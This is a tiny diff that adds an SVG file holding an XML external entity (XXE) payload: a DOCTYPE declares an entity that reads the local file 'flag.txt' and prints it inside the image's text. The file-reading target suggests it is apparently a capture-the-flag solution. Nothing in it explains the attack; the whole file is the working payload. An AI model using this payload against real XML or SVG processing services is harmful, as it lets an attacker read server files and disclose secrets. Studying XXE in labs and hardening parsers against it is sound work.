@@ -1,0 +1,5 @@
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:flag.txt"> ]>
+<svg height="3000" width="20000">
+  <text x="0" y="15" fill="red">test &xxe; test</text>
+</svg>
